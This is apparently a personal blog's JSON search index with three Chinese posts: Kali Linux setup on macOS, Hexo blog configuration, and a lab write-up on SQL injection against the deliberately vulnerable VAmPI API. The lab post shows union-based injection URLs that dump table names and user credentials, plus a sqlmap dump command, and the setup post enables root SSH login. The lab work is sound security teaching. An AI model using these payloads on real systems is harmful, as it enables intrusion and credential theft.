{"meta":{"title":"Yuuki's blog","subtitle":"subtitle","description":"CyberSec | WebSec | Blog","author":"yuuki","url":"https://blog.uuki.moe","root":"/"},"pages":[{"title":"","date":"2023-05-28T11:50:14.124Z","updated":"2023-05-28T11:50:14.124Z","comments":true,"path":"404.html","permalink":"https://blog.uuki.moe/404.html","excerpt":"","text":"404 很抱歉，您访问的页面不存在 可能是输入地址有误或该地址已被删除"},{"title":"Links","date":"2023-05-28T11:50:14.126Z","updated":"2023-05-28T11:50:14.125Z","comments":true,"path":"friends/index.html","permalink":"https://blog.uuki.moe/friends/index.html","excerpt":"","text":""},{"title":"Categories","date":"2023-05-28T11:50:14.131Z","updated":"2023-05-28T11:50:14.131Z","comments":true,"path":"categories/index.html","permalink":"https://blog.uuki.moe/categories/index.html","excerpt":"","text":""},{"title":"About","date":"2023-05-28T11:50:14.123Z","updated":"2023-05-28T11:50:14.123Z","comments":true,"path":"about/index.html","permalink":"https://blog.uuki.moe/about/index.html","excerpt":"","text":""},{"title":"Tags","date":"2023-05-28T11:50:14.124Z","updated":"2023-05-28T11:50:14.124Z","comments":true,"path":"tags/index.html","permalink":"https://blog.uuki.moe/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"MacOS 下 Kali Linux 的安装配置和更新","slug":"Install-kali-linux","date":"2023-06-02T21:44:47.000Z","updated":"2023-06-03T10:10:41.182Z","comments":true,"path":"2023/06/03/Install-kali-linux/","link":"","permalink":"https://blog.uuki.moe/2023/06/03/Install-kali-linux/","excerpt":"","text":"各文件下载地址 VMware Fusion 下载地址: https://customerconnect.vmware.com/evalcenter?p=fusion-player-personal-13 镜像下载地址: https://www.kali.org/get-kali/#kali-installer-images 更新 Kali Linux: https://www.kali.org/docs/general-use/updating-kali/ 环境说明 VMware Fusion 版本: Player 版本 13.0.2 (21581413) Kali Linux 镜像文件: kali-linux-2023.1-installer-arm64.iso MacOS 版本: Apple M1 Pro 13.3.1 VMware Fusion 安装 Kali Linux 在 VMWare Fusion 中选择 Install disc or image 安装系统 配置参数核心 4 个, 内存 4096 MB, 硬盘空间 30 G 安装完成后设置 Kali Linux 分辨率与 MacOS 相同 在设置中打开 Kali HDMI Mode (类似高清修复的东西) 将光标大小设置为 45 配置中国地区 apt 下载源# 打开 sources.lists 源配置文件sudo vim /etc/apt/sources.list# 注释掉官方源后, 添加如下内容deb https://mirrors.ustc.edu.cn/debian/ bullseye main contrib non-freedeb-src https://mirrors.ustc.edu.cn/debian/ bullseye main contrib non-freedeb https://mirrors.aliyun.com/kali kali-rolling main non-free contribdeb-src https://mirrors.aliyun.com/kali kali-rolling main non-free contrib# 更新 apt 源sudo apt-get update 修改用户主目录英文文件夹 终端输入 vim ~/.config/user-dirs.dirs 打开配置文件, 按需修改即可 (下方为修改后的内容) XDG_DESKTOP_DIR=&quot;$HOME/Desktop&quot;XDG_DOWNLOAD_DIR=&quot;$HOME/Downloads&quot;XDG_TEMPLATES_DIR=&quot;$HOME/Templates&quot;XDG_PUBLICSHARE_DIR=&quot;$HOME/Public&quot;XDG_DOCUMENTS_DIR=&quot;$HOME/Documents&quot;XDG_MUSIC_DIR=&quot;$HOME/Music&quot;XDG_PICTURES_DIR=&quot;$HOME/Pictures&quot;XDG_VIDEOS_DIR=&quot;$HOME/Videos&quot; 进入用户根目录, 修改文件名称为对应的名称后, 重启系统即可 SSH 远程连接配置在 /etc/ssh/sshd_config 配置中新增一行 PermirRootLogin yes 允许 root 登录 SSH 设置 ssh 服务开机自启动, 并重启 ssh systemctl enable sshsystemctl restart ssh 配置共享文件夹如图配置即可, 真机的 kali 文件夹将出现在 Kali /mnt/hgfs 目录下 如果没有 VMware Tools 可以参考 链接 进行配置, 正常情况下在虚拟机安装完成后将会自动安装 VMware Tools 为了方便, 将共享目录软连接到用户主目录下 (后续的环境也将会在这个目录下面进行配置) ln -s /mnt/hgfs/kali ~/kali 科学上网代理配置这里真机使用了 Clash 搭配汉化补丁, 开启了 7890 的 socks5 代理端口。在 kali 的 ~/.zshrc 内新增内容 (将 192.168.247.1 修改为真实机器与 kali 在同一局域网内的 IP 地址) alias pon=&quot;export https_proxy=http://192.168.247.1:7890 http_proxy=http://192.168.247.1:7890 all_proxy=socks5://192.168.247.1:7890&quot;alias poff=&quot;unset https_proxy; unset http_proxy; unset all_proxy&quot; 下面的部分环境会用到 docker, docker-compose。如果拉取镜像缓慢, 可以参考链接优化速度。 ARL 灯塔安装配置GitHub 地址: https://github.com/TophantTechnology/ARL mkdir docker_arlwget -O docker_arl/docker.zip https://github.com/TophantTechnology/ARL/releases/download/v2.5.5/docker.zipcd docker_arlunzip -o docker.zipdocker-compose pulldocker volume create arl_dbdocker-compose up -d 启动完成后访问 https://kali-ip-address:5003, 默认账号密码为 admin/arlpass 安装完成后 docker images 将会新增如下几个镜像文件 docker images REPOSITORY TAG IMAGE ID CREATED SIZEtophant/arl latest 408fde22de0e 2 weeks ago 817MBmongo 4.0.27 f83cda2e164c 18 months ago 400MBrabbitmq 3.8.19-management-alpine 27a2c6b36827 22 months ago 156MB 安装中文输入法 (fcitx) 输入 sudo apt install fcitx 安装 fcitx 输入法框架 在终端输入 im-config 选择 fcitx 作为默认输入法 输入 sudo apt install fcitx-googlepinyin 安装谷歌拼音输入法 输入 reboot 重启 Kali Linux 安装完成后可以在右上角打开配置设置字体大小等偏好设置 安装 Clash 代理工具 进入 https://github.com/Dreamacro/clash/ 下载对应操作系统 .tar.gz 结尾的 Clash 压缩包, 将压缩包中 clash 文件夹解压至用户根目录 进入 https://github.com/Z-Siqi/Clash-for-Windows_Chinese&#x2F;releases&#x2F;tag&#x2F;CFW-V0.20.23_CN 下载 app.asar 汉化补丁, 并移动到 clash/resources 目录 导入配置文件: 进入 ~/.config/clash 目录, 将 .yaml 代理配置文件拖入即可 安装 Go 语言环境 进入 go 官网 https://go.dev/dl/, 搜索对应关键字 (arm 或 amd) 找到 .tar.gz 结尾的压缩包 解压后将 go 文件夹移动到 /usr/bin 目录 使用 open ~/.zshrc 打开 zsh 配置文件, 添加如下内容, 保存后退出 export GOPATH=/usr/bin/goexport PATH=$PATH:$GOROOT/bin:$GOPATH/bin 命令行输入 source ~/.zshrc 重新加载 zsh 配置文件即可 更新 Kali Linux# 查看当前版本$ uname -aLinux secuuki 6.1.0-kali5-arm64 #1 SMP Debian 6.1.12-1kali2 (2023-02-23) aarch64 GNU/Linux# 更新版本$ sudo apt update$ sudo apt full-upgrade -y# 重启系统$ reboot# 查看更新后版本号$ uname -aLinux secuuki 6.1.0-kali9-arm64 #1 SMP Debian 6.1.27-1kali1 (2023-05-12) aarch64 GNU/Linux","categories":[{"name":"env","slug":"env","permalink":"https://blog.uuki.moe/categories/env/"}],"tags":[{"name":"Kali Linux","slug":"Kali-Linux","permalink":"https://blog.uuki.moe/tags/Kali-Linux/"}],"author":"Yuuki"},{"title":"Lab - VAmPI - 环境搭建 & SQL Injection","slug":"VAmPI-sql-injection","date":"2023-05-30T19:50:16.000Z","updated":"2023-06-03T09:38:44.654Z","comments":true,"path":"2023/05/31/VAmPI-sql-injection/","link":"","permalink":"https://blog.uuki.moe/2023/05/31/VAmPI-sql-injection/","excerpt":"VAmPI 是一个具有 OWASP Top 10 漏洞的 REST API 的程序, 可以通过一个开关来控制 API 是否易受攻击, 可以用于测试、学习、教学的目的。在 https://erev0s.com/blog/vampi-vulnerable-api-security-testing/ 可以看到更加全面的介绍。","text":"VAmPI 是一个具有 OWASP Top 10 漏洞的 REST API 的程序, 可以通过一个开关来控制 API 是否易受攻击, 可以用于测试、学习、教学的目的。在 https://erev0s.com/blog/vampi-vulnerable-api-security-testing/ 可以看到更加全面的介绍。 环境搭建有三种搭建环境的方式, 分别是 Python, docker, docker-compose。本文使用 Python 搭建。 git clone https://github.com/erev0s/VAmPI.gitcd VAmPI/python3 -m pip install -r requirements.txt 将环境拉倒本地后可以直接使用 python3 app.py 运行。在 openapi_specs 目录下有一个 openapi3.yml, 可以用于在 swagger editor 或 Postman 等工具生成 API 文档。 为了避免与较新版本的 MacOS AirPlay Receiver 的端口冲突, 需要修改 app.py 与 openapi3.yml 内的端口号为 5001 使用 python3 app.py 启动服务后浏览器访问 http://10.0.0.100:5001/。在 Postman 导航栏选择 File -&gt; Import 导入 openapi3.yml 配置文件开始测试。 SQL Injection导致 SQL 注入的查询用户名接口为 /users/v1/&#123;username&#125;。功能函数 get_user 代码如下: @staticmethoddef get_user(username): if vuln: # SQLi Injection user_query = f&quot;SELECT * FROM users WHERE username = &#x27;&#123;username&#125;&#x27;&quot; query = db.session.execute(text(user_query)) ret = query.fetchone() if ret: fin_query = &#x27;&#123;&quot;username&quot;: &quot;%s&quot;, &quot;email&quot;: &quot;%s&quot;&#125;&#x27; % (ret[1], ret[3]) else: fin_query = None else: fin_query = User.query.filter_by(username=username).first() return fin_query 靶场 SQL 环境使用的是 SQLite 数据库, 需要注意 SQLite 没有库这个概念的, 查询语句中不需要指定数据库。 查询语句 user_query = f&quot;SELECT * FROM users WHERE username = &#39;&#123;username&#125;&#39;&quot; 为字符型查询, 注入时使用单引号闭合。 查询结果 fin_query = &#39;&#123;&quot;username&quot;: &quot;%s&quot;, &quot;email&quot;: &quot;%s&quot;&#125;&#39; % (ret[1], ret[3]) 使用键 1 和 3 的位置作为响应结果, 故数据回显位在 2 和 4。 确定注入点当用户存在将返回 username, email [ &#123; &quot;username&quot;: &quot;&lt;string&gt;&quot;, &quot;email&quot;: &quot;&lt;string&gt;&quot; &#125;, &#123; &quot;username&quot;: &quot;&lt;string&gt;&quot;, &quot;email&quot;: &quot;&lt;string&gt;&quot; &#125;] 当用户不存在 message 将返回 User not found &#123; &quot;status&quot;: &quot;fail&quot;, &quot;message&quot;: &quot;&lt;string&gt;&quot;&#125; 单引号 &#39; 报错, 添加注释符号后页面正常显示, 判断注入点存在 http://localhost:5001/users/v1/1 # 正常http://localhost:5001/users/v1/1&#x27; # 报错http://localhost:5001/users/v1/1&#x27; --+ # 正常 在这里页面回显了查询语句 SELECT * FROM users WHERE username = &#39;1&#39;&#39; 明确指出这是字符型的注入点, 省略 确定闭合方式 这一步骤 判断查询结果列数使用 ORDER BY 语句判断查询结果列数。 http://127.0.0.1:5001/users/v1/1&#x27; union select ORDER BY 4 --+ # 正常http://127.0.0.1:5001/users/v1/1&#x27; union select ORDER BY 5 --+ # 正常http://127.0.0.1:5001/users/v1/1&#x27; union select ORDER BY 6 --+ # 报错 当排序语句为 ORDER BY 6 时, 页面将报错, 判断查询结果为 5 列。 判断数据回显位使用 UNION 联合查询判断数据回显位。 http://127.0.0.1:5001/users/v1/1&#x27; UNION SELECT 1,2,3,4,5 --+ 本身 username = 1 结果并不存在, 服务器将会返回 UNION 查询语句的结果, 响应结果中包含 2, 4 , 说明 2 和 4 的位置是数据回显位。 &#123; &quot;username&quot;: &quot;2&quot;, &quot;email&quot;: &quot;4&quot;&#125; 查询数据库信息使用 sqlite 查看版本信息函数 sqlite_version() 查询数据库版本信息 http://127.0.0.1:5001/users/v1/1&#x27; UNION SELECT 1,sqlite_version(),3,4,5 FROM sqlite_schema --+ // 20230601101335// http://127.0.0.1:5001/users/v1/1&#x27;%20UNION%20SELECT%201,sqlite_version(),3,4,5%20FROM%20sqlite_schema%20--+&#123; &quot;username&quot;: &quot;3.39.5&quot;, &quot;email&quot;: &quot;4&quot;&#125; 检索数据库数据查表名http://127.0.0.1:5001/users/v1/1&#x27; UNION SELECT 1,group_concat(tbl_name),3,4,5 FROM sqlite_master WHERE type=&#x27;table&#x27; --+ // 20230601102601// http://127.0.0.1:5001/users/v1/1&#x27;%20UNION%20SELECT%201,group_concat(tbl_name),3,4,5%20FROM%20sqlite_master%20WHERE%20type=&#x27;table&#x27;%20--+&#123; &quot;username&quot;: &quot;users,books&quot;, &quot;email&quot;: &quot;4&quot;&#125; 查字段 注意, 这里 pragma_table_info(&#39;users&#39;) 用于获取指定表的列信息，其中name是列名的字段。 查询 users 表所有字段 http://127.0.0.1:5001/users/v1/1&#x27; UNION SELECT 1,group_concat(name),3,4,5 FROM pragma_table_info(&#x27;users&#x27;) --+ &#123; &quot;username&quot;: &quot;id,username,password,email,admin&quot;, &quot;email&quot;: &quot;4&quot;&#125; 查询 books 表所有字段 http://127.0.0.1:5001/users/v1/1&#x27; UNION SELECT 1,group_concat(name),3,4,5 FROM pragma_table_info(&#x27;books&#x27;) --+ &#123; &quot;username&quot;: &quot;id,book_title,secret_content,user_id&quot;, &quot;email&quot;: &quot;4&quot;&#125; 查数据查询 users 表下 username 和 password 字段的数据 http://127.0.0.1:5001/users/v1/1&#x27; UNION SELECT 1,group_concat(printf(&#x27;%s@%s&#x27;,username,password)),3,4,5 FROM &#x27;users&#x27; --+ &#123; &quot;username&quot;: &quot;name1@pass1,name2@pass2,admin@pass1&quot;, &quot;email&quot;: &quot;4&quot;&#125; 查询 books 表下 book_title 和 secret_content 字段的数据 http://127.0.0.1:5001/users/v1/1&#x27; UNION SELECT 1,group_concat(printf(&#x27;%s@%s&#x27;,book_title,secret_content)),3,4,5 FROM &#x27;books&#x27; --+ &#123; &quot;username&quot;: &quot;bookTitle19@secret for bookTitle19,bookTitle56@secret for bookTitle56,bookTitle8@secret for bookTitle8&quot;, &quot;email&quot;: &quot;4&quot;&#125; 使用 sqlmap 对 URL 中的路径参数进行注入测试时, 可以使用星号 * 表示路径参数的位置, 使用 sqlmap -u &quot;http://127.0.0.1:5001/users/v1/*&quot; --dump 同样可以检索出数据库内所有的数据。","categories":[{"name":"sec","slug":"sec","permalink":"https://blog.uuki.moe/categories/sec/"}],"tags":[{"name":"Pentesting API","slug":"Pentesting-API","permalink":"https://blog.uuki.moe/tags/Pentesting-API/"}],"author":"Yuuki"},{"title":"Hello World","slug":"hello-world","date":"2023-05-27T16:00:00.000Z","updated":"2023-05-28T12:49:15.000Z","comments":true,"path":"2023/05/28/hello-world/","link":"","permalink":"https://blog.uuki.moe/2023/05/28/hello-world/","excerpt":"Welcome to my blog. 👋 这是第一个帖子, 记录了这个站点的诞生。","text":"Welcome to my blog. 👋 这是第一个帖子, 记录了这个站点的诞生。 TimeLog 2023-05-28编辑文章, 发布博客 (https://uuki.blog.moe)2023-05-29补充集成 Obsidian 部分内容2023-05-30关闭光标样式...custom_css: cursor: enable: false...关闭平滑滚动...scroll_smooth: false... 常用链接 Volantis 主题文档: https://volantis.js.org/ 1. 初始化 Hexo blog## 初始化cd ~/bloghexo initgit init .## 安装主题# https://github.com/volantis-x/hexo-theme-volantis/git submodule add https://github.com/volantis-x/hexo-theme-volantis.git themes/volantiscp themes/volantis/_config.yml ./_config.volantis.yml 修改主题配置文件_config.volantis.yml+ 131 - navbar: # 导航栏- 171 - cover: # 头图+ 214 - pages: # 友链页面配置+ 387 - comments: # 评论+ 563 - sidebar: # 侧边栏+ 728 - site_footer: # 页脚+ 817 - plugins: # 插件+ 1053 - rightmenus: # 右键菜单 安装拓展插件## 音乐播放器# https://aplayer.js.org/#/zh-Hans/npm install aplayer --save## Hexo 搜索# https://github.com/alexbruno/hexo-generator-json-contentnpm install hexo-generator-json-content --save## Highlight# https://highlightjs.org/static/demo/# https://www.jsdelivr.com/package/npm/@highlightjs/cdn-assets?path=styles&amp;tab=files暂时没有启用, 而是使用 Hexo 内置的 Highlight## RSSnpm install hexo-generator-feed --save本地文件 atom.xml 会存在乱码, 部署到远程就没问题了## Deploy# https://github.com/hexojs/hexo-deployer-gitnpm install hexo-deployer-git --save 元数据盒子各种首页的 Front-matter about/index.mdlayout: docsindex: truetitle: Abouttop_meta: falsebottom_meta: falsesidebar: [] categories/index.mdlayout: categoryindex: truetitle: Categoriestop_meta: falsebottom_meta: falsesidebar: [] tags/index.mdlayout: tagindex: truetitle: Tagstop_meta: falsebottom_meta: falsesidebar: [] friends/index.mdlayout: friendsindex: truetitle: Linkstop_meta: falsebottom_meta: falsesidebar: [] 2. 集成 Obsidian注意, 使用 Obsidian 打开 hexo 博客根目录作为仓库, 而不是 _posts 或其他路径 本地保存图片 Custom Attachment Location: https://github.com/RainCat1998/obsidian-custom-attachment-location 参考如下参数进行配置 Location for New Attachments: source/assets/$&#123;filename&#125; Pasted Image Name: image-$&#123;date&#125; Date Format: YYYYMMDD_HHmmssSSS Automatically rename attachment folder: 打开 Automatically rename attachment files: 打开 直接在 Obsidian 内粘贴图片即可自动将图片保存在本地, 文件路径对应为 source/assets/Markdown文件名称/image-时间戳 创建文章模板 Templater: https://silentvoid13.github.io/Templater/ 创建模板文件 cd ~/blogmkdir template ## template/post.mdtitle: &lt;% tp.file.title %&gt;date: &lt;% tp.date.now(&quot;YYYY-MM-DD HH:mm:ss&quot;) %&gt;author: Yuukiupdated: headimg: description: tags: [&lt;% tp.system.prompt(&quot;Tag&quot;, &quot;&quot;) %&gt;]categories: [&lt;% tp.system.prompt(&quot;Category&quot;, &quot;&quot;) %&gt;]## template/timeNow.md&lt;% tp.date.now(&quot;YYYY-MM-DD HH:mm:ss&quot;) %&gt;## template/title.md&lt;% tp.file.title %&gt; 修改配置文件 设置模板文件夹: General Settings -&gt; Template folder location: template 勾选 Enable Folder Templates: 允许指定目录的文件在新建时自动调用模板 配置文件选择 Folder Templates -&gt; Add New: Folder&#x3D;source/_posts, Template&#x3D;template/post.md 指示 _posts 目录下的文件在新建时自动调用 post.md 模板文件 可视化管理文章 MAKE.md https://github.com/Make-md/makemd 注意, 插件在管理文件源属性时将 tag 作为标签管理, 与 Hexo 冲突, 需要进入插件配置页面, 找到 Context -&gt; 取消勾选 Contexts 创建自定义空间 Archive 用于管理 _posts 目录下的所有文章 像是本篇文章的 Front-matter 原属性内包含的 categories=dev (分类) 和 tags=blog (标签), 都可以作为 MAKE.md 插件的分许一句, 在创建空间时, 选择 New Smart Space 可以实现对不同分类或不同标签的文章进行单独的管理。 清理无用附件Plan A: 依赖于 File Cleaner 插件 因为这个插件默认检索全仓库, 需要多加一点规则避免删除有用的文件 在删除之后, 右上角会弹窗提示, 如果有意外情况记得在清空废纸篓之前手动检查 Excluded Foldersnode_modules/scaffolds/template/themes/ Plan B: 使用 Find orphaned files and broken links 插件 Find orphaned files and broken links 是一个可以用于发现空文件, 没有链接的文件的插件。 配置要更加复杂, 我也没有采用这种方案 3. Hexo 半自动化部署半自动化脚本 (Shell)基于 MacOS 操作系统 ./hexo status # 判断运行状态./hexo restart # 重新启动./hexo start # 启动./hexo stop # 停止./hexo deploy # 部署至 GitHub 编写 bash 脚本用于自动化操作 hexo hexo.sh#!/bin/bash# 检查 hexo 进程状态function check_status() &#123; if ps aux | grep hexo | grep -v grep | grep -v hexo.sh &gt;/dev/null; then pid=$(ps aux | grep hexo | grep -v grep | grep -v hexo.sh | awk &#x27;&#123;print $2&#125;&#x27;) echo &quot;Hexo server is running [$pid]&quot; else echo &quot;Hexo server is not running...&quot; fi&#125;# 终止 hexo 进程function stop_hexo() &#123; if ps aux | grep hexo | grep -v grep | grep -v hexo.sh &gt;/dev/null; then pid=$(ps aux | grep hexo | grep -v grep | grep -v hexo.sh | awk &#x27;&#123;print $2&#125;&#x27;) echo &quot;Hexo server is running [$pid]&quot; kill $pid echo &quot;Hexo server is stoped...&quot; else echo &quot;Hexo server is not running...&quot; fi&#125;# 重启 hexo 进程function restart_hexo() &#123; stop_hexo start_hexo&#125;# 启动 hexo 进程function start_hexo() &#123; if ps aux | grep hexo | grep -v grep | grep -v hexo.sh &gt;/dev/null; then echo &quot;Hexo is running...&quot; else hexo server &amp; pid=$(ps aux | grep hexo | grep -v grep | grep -v hexo.sh | awk &#x27;&#123;print $2&#125;&#x27;) echo &quot;Hexo is running... [$pid]&quot; fi&#125;# 部署 hexo 到 GitHubfunction deploy_hexo() &#123; hexo clean hexo deploy&#125;# 根据命令行参数执行对应的操作case $1 in &quot;status&quot;) check_status ;; &quot;stop&quot;) stop_hexo ;; &quot;restart&quot;) restart_hexo ;; &quot;start&quot;) start_hexo ;; &quot;deploy&quot;) deploy_hexo ;; *) echo &quot;使用方法: $0 [status|stop|restart|start|deploy]&quot; exit 1 ;;esac 集成 Shell command 依赖于 Shell command 插件 顶部导航栏选择 Environments 下方找到 Add directories to the PATH environment variable, 为 hexo 命令添加环境变量 Shell command 详细配置参考下面的图片 👇🏻 这里需要将命令中顶部导航栏 Output -&gt; Output channel for stdout 设置为 Notification balloon 使用方法: Command + P 打开命令面板, 输入 hexo server, 回车后键入对应操作即可。也可以搭配 Commander 插件, 在左侧创建按钮更方便的管理。","categories":[{"name":"env","slug":"env","permalink":"https://blog.uuki.moe/categories/env/"}],"tags":[{"name":"blog","slug":"blog","permalink":"https://blog.uuki.moe/tags/blog/"}],"author":"Yuuki"}],"categories":[{"name":"env","slug":"env","permalink":"https://blog.uuki.moe/categories/env/"},{"name":"sec","slug":"sec","permalink":"https://blog.uuki.moe/categories/sec/"}],"tags":[{"name":"Kali Linux","slug":"Kali-Linux","permalink":"https://blog.uuki.moe/tags/Kali-Linux/"},{"name":"Pentesting API","slug":"Pentesting-API","permalink":"https://blog.uuki.moe/tags/Pentesting-API/"},{"name":"blog","slug":"blog","permalink":"https://blog.uuki.moe/tags/blog/"}]}